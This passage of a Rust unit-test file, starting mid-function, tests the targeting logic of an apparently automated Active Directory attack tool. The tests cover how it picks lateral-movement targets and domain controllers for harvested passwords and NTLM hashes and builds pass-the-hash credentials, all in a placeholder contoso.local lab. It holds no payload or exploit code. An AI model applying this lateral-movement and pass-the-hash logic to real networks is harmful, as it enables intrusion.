            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    // --- resolve_cred_domain ---------------------------------------------

    #[test]
    fn resolve_cred_domain_passes_through_fqdn() {
        let s = StateInner::new("op".into());
        assert_eq!(resolve_cred_domain(&s, "Contoso.Local"), "contoso.local");
    }

    #[test]
    fn resolve_cred_domain_uses_netbios_map_lowercase_key() {
        let mut s = StateInner::new("op".into());
        s.netbios_to_fqdn
            .insert("child".into(), "child.contoso.local".into());
        assert_eq!(resolve_cred_domain(&s, "CHILD"), "child.contoso.local");
    }

    #[test]
    fn resolve_cred_domain_uses_netbios_map_uppercase_key_fallback() {
        let mut s = StateInner::new("op".into());
        s.netbios_to_fqdn
            .insert("CHILD".into(), "child.contoso.local".into());
        assert_eq!(resolve_cred_domain(&s, "CHILD"), "child.contoso.local");
    }

    #[test]
    fn resolve_cred_domain_falls_back_to_lowercased_raw() {
        let s = StateInner::new("op".into());
        // No mapping, no dot → just lowercased.
        assert_eq!(resolve_cred_domain(&s, "UNKNOWN"), "unknown");
    }

    // --- resolve_host_domain ---------------------------------------------

    #[test]
    fn resolve_host_domain_uses_hostname_fqdn() {
        let s = StateInner::new("op".into());
        let h = make_host("dc01.contoso.local", "192.168.58.10");
        assert_eq!(resolve_host_domain(&s, &h), "contoso.local");
    }

    #[test]
    fn resolve_host_domain_falls_back_to_dc_map_for_bare_hostname() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let h = make_host("dc01", "192.168.58.10");
        assert_eq!(resolve_host_domain(&s, &h), "contoso.local");
    }

    #[test]
    fn resolve_host_domain_empty_when_no_signal() {
        let s = StateInner::new("op".into());
        let h = make_host("dc01", "192.168.58.10");
        assert!(resolve_host_domain(&s, &h).is_empty());
    }

    // --- domain_is_same_or_relative --------------------------------------

    #[test]
    fn same_or_relative_same_domain() {
        assert!(domain_is_same_or_relative("contoso.local", "contoso.local"));
    }

    #[test]
    fn same_or_relative_child_of_cred() {
        assert!(domain_is_same_or_relative(
            "child.contoso.local",
            "contoso.local"
        ));
    }

    #[test]
    fn same_or_relative_parent_of_cred() {
        assert!(domain_is_same_or_relative(
            "contoso.local",
            "child.contoso.local"
        ));
    }

    #[test]
    fn same_or_relative_cross_forest_false() {
        assert!(!domain_is_same_or_relative(
            "fabrikam.local",
            "contoso.local"
        ));
    }

    #[test]
    fn same_or_relative_empty_host_returns_false() {
        assert!(!domain_is_same_or_relative("", "contoso.local"));
    }

    // --- find_lateral_targets_for_cred_domain ----------------------------

    #[test]
    fn find_targets_collects_same_domain_non_owned_hosts() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.hosts
            .push(make_host("sql01.contoso.local", "192.168.58.20"));
        s.hosts
            .push(make_host("web01.fabrikam.local", "192.168.58.40"));
        let mut targets = find_lateral_targets_for_cred_domain(&s, "contoso.local");
        targets.sort();
        assert_eq!(targets, vec!["192.168.58.10", "192.168.58.20"]);
    }

    #[test]
    fn find_targets_excludes_owned_hosts() {
        let mut s = StateInner::new("op".into());
        let mut owned = make_host("dc01.contoso.local", "192.168.58.10");
        owned.owned = true;
        s.hosts.push(owned);
        s.hosts
            .push(make_host("sql01.contoso.local", "192.168.58.20"));
        assert_eq!(
            find_lateral_targets_for_cred_domain(&s, "contoso.local"),
            vec!["192.168.58.20"]
        );
    }

    #[test]
    fn find_targets_includes_child_domain_hosts() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc02.child.contoso.local", "192.168.58.30"));
        // Parent cred → child host: relative, included.
        let targets = find_lateral_targets_for_cred_domain(&s, "contoso.local");
        assert_eq!(targets, vec!["192.168.58.30"]);
    }

    #[test]
    fn find_targets_skips_unknown_domain_hosts() {
        let mut s = StateInner::new("op".into());
        // Bare hostname with no DC-IP mapping → unknown domain → skipped.
        s.hosts.push(make_host("mystery", "192.168.58.99"));
        assert!(find_lateral_targets_for_cred_domain(&s, "contoso.local").is_empty());
    }

    // --- find_dc_ips_for_cred_domain --------------------------------------

    #[test]
    fn find_dc_ips_same_and_child_domain() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let mut ips = find_dc_ips_for_cred_domain(&s, "contoso.local");
        ips.sort();
        assert_eq!(ips, vec!["192.168.58.10", "192.168.58.11"]);
    }

    #[test]
    fn find_dc_ips_excludes_parent_when_cred_is_child() {
        // Parent forest membership is not asymmetric — child cred shouldn't
        // try parent DC via this filter (parent cred → child DC is fine via
        // the suffix rule, but child cred → parent DC is rejected here).
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        let ips = find_dc_ips_for_cred_domain(&s, "child.contoso.local");
        assert_eq!(ips, vec!["192.168.58.11"]);
    }

    // --- select_credential_expansion_work --------------------------------

    #[test]
    fn select_creds_skips_empty_password() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "", "contoso.local"));
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        assert!(select_credential_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_creds_skips_empty_domain() {
        let mut s = StateInner::new("op".into());
        s.credentials.push(make_cred("alice", "P@ss", ""));
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        assert!(select_credential_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_creds_skips_already_processed() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "P@ss", "contoso.local"));
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.mark_processed(DEDUP_EXPANSION_CREDS, "contoso.local:alice".into());
        assert!(select_credential_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_creds_skips_when_no_targets() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "P@ss", "contoso.local"));
        // No hosts → no targets → skip.
        assert!(select_credential_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_creds_skips_quarantined_principal() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "P@ss", "contoso.local"));
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.quarantine_principal("alice", "contoso.local");
        assert!(select_credential_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_creds_picks_eligible_credential() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "P@ss", "contoso.local"));
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_credential_expansion_work(&s, 10);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].credential.username, "alice");
        assert_eq!(work[0].targets, vec!["192.168.58.10"]);
        assert_eq!(work[0].dc_ips, vec!["192.168.58.10"]);
        assert!(!work[0].is_admin);
    }

    #[test]
    fn select_creds_caps_at_max_items() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        for u in &["alice", "bob", "carol", "dave"] {
            s.credentials.push(make_cred(u, "P@ss", "contoso.local"));
        }
        assert_eq!(select_credential_expansion_work(&s, 2).len(), 2);
        assert_eq!(select_credential_expansion_work(&s, 3).len(), 3);
    }

    #[test]
    fn select_creds_admin_overrides_delegation_account_filter() {
        // Non-admin delegation account is skipped — admin delegation account
        // is kept (admin needs to expand regardless of S4U reservation).
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        // Pre-seed a vuln so `is_delegation_account` returns true.
        let mut details = std::collections::HashMap::new();
        details.insert("account_name".into(), serde_json::json!("svc_sql"));
        let v = ares_core::models::VulnerabilityInfo {
            vuln_id: "v1".into(),
            vuln_type: "constrained_delegation".into(),
            target: "192.168.58.10".into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 1,
        };
        s.discovered_vulnerabilities.insert("v1".into(), v);
        assert!(s.is_delegation_account("svc_sql"));

        s.credentials
            .push(make_cred("svc_sql", "P@ss", "contoso.local"));
        // Non-admin delegation → filtered out.
        assert!(select_credential_expansion_work(&s, 10).is_empty());

        // Admin flag overrides.
        s.credentials.clear();
        s.credentials
            .push(make_admin_cred("svc_sql", "P@ss", "contoso.local"));
        assert_eq!(select_credential_expansion_work(&s, 10).len(), 1);
    }

    // --- hash_expansion_dedup_key ---------------------------------------

    #[test]
    fn hash_dedup_key_lowercases_and_truncates() {
        let h = make_ntlm_hash(
            "Administrator",
            "AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0",
            "Contoso.Local",
        );
        let k = hash_expansion_dedup_key(&h);
        assert_eq!(
            k,
            "contoso.local:administrator:AAD3B435B51404EEAAD3B435B51404EE"
        );
    }

    #[test]
    fn hash_dedup_key_short_hash_passed_through() {
        let h = make_ntlm_hash("alice", "abc", "contoso.local");
        assert_eq!(hash_expansion_dedup_key(&h), "contoso.local:alice:abc");
    }

    // --- build_pth_credential --------------------------------------------

    #[test]
    fn build_pth_cred_assigns_hash_to_password_slot() {
        let h = make_ntlm_hash("alice", "deadbeef".repeat(4).as_str(), "contoso.local");
        let c = build_pth_credential(&h);
        assert_eq!(c.id, "pth_alice");
        assert_eq!(c.username, "alice");
        assert_eq!(c.password, h.hash_value);
        assert_eq!(c.domain, "contoso.local");
        assert_eq!(c.source, "hash_pth");
        assert!(!c.is_admin);
    }

    // --- select_hash_expansion_work --------------------------------------

    #[test]
    fn select_hash_work_filters_non_ntlm() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        let mut h = make_ntlm_hash("alice", "aaaaaaaa", "contoso.local");
        h.hash_type = "AES256".into();
        s.hashes.push(h);
        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_filters_krbtgt() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.hashes
            .push(make_ntlm_hash("krbtgt", "aaaaaaaa", "contoso.local"));
        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_filters_machine_accounts() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.hashes
            .push(make_ntlm_hash("DC01$", "aaaaaaaa", "contoso.local"));
        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_filters_already_processed() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        let h = make_ntlm_hash("alice", "aaaaaaaa", "contoso.local");
        let key = hash_expansion_dedup_key(&h);
        s.hashes.push(h);
        s.mark_processed(DEDUP_HASH_LATERAL, key);
        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_returns_eligible_hash() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.hashes
            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));
        let work = select_hash_expansion_work(&s, 10);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].hash.username, "alice");
        assert_eq!(work[0].resolved_domain, "contoso.local");
        assert_eq!(work[0].targets, vec!["192.168.58.10"]);
    }

    #[test]
    fn select_hash_work_resolves_netbios_domain_for_dispatch() {
        let mut s = StateInner::new("op".into());
        s.netbios_to_fqdn
            .insert("child".into(), "child.contoso.local".into());
        s.hosts
            .push(make_host("dc01.child.contoso.local", "192.168.58.10"));
        s.hashes.push(make_ntlm_hash("alice", "aaaaaaaa", "CHILD"));

        let work = select_hash_expansion_work(&s, 10);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].resolved_domain, "child.contoso.local");
        assert_eq!(work[0].targets, vec!["192.168.58.10"]);
    }

    #[test]
    fn select_hash_work_skips_cross_forest_targets() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("srv01.fabrikam.local", "192.168.58.40"));
        s.hashes
            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));

        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_allows_same_domain_dc_without_host_target() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.hashes
            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));

        let work = select_hash_expansion_work(&s, 10);
        assert_eq!(work.len(), 1);
        assert!(work[0].targets.is_empty());
        assert_eq!(work[0].dc_ips, vec!["192.168.58.10"]);
    }

    #[test]
    fn select_hash_work_skips_dominated_domain() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        s.hashes
            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));
        s.dominated_domains.insert("contoso.local".into());

        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_excludes_owned_hosts() {
        let mut s = StateInner::new("op".into());
        let mut h = make_host("dc01.contoso.local", "192.168.58.10");
        h.owned = true;
        s.hosts.push(h);
        s.hashes
            .push(make_ntlm_hash("alice", "aaaaaaaa", "contoso.local"));
        // No non-owned hosts → no work.
        assert!(select_hash_expansion_work(&s, 10).is_empty());
    }

    #[test]
    fn select_hash_work_caps_at_max_items() {
        let mut s = StateInner::new("op".into());
        s.hosts
            .push(make_host("dc01.contoso.local", "192.168.58.10"));
        for (i, u) in ["alice", "bob", "carol"].iter().enumerate() {
            let v = format!("{i:032}");
            s.hashes.push(make_ntlm_hash(u, &v, "contoso.local"));
        }
        assert_eq!(select_hash_expansion_work(&s, 2).len(), 2);
    }

    // --- find_pth_dc_ips_for_hash ----------------------------------------

    #[test]
    fn pth_dc_ips_same_forest_only() {
        let mut s = StateInner::new("op".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.domain_controllers
            .insert("child.contoso.local".into(), "192.168.58.11".into());
        s.domain_controllers
            .insert("fabrikam.local".into(), "192.168.58.40".into());
        let mut ips = find_pth_dc_ips_for_hash(&s, "contoso.local");
        ips.sort();
        assert_eq!(ips, vec!["192.168.58.10", "192.168.58.11"]);
        assert!(!ips.contains(&"192.168.58.40".to_string()));
    }
}
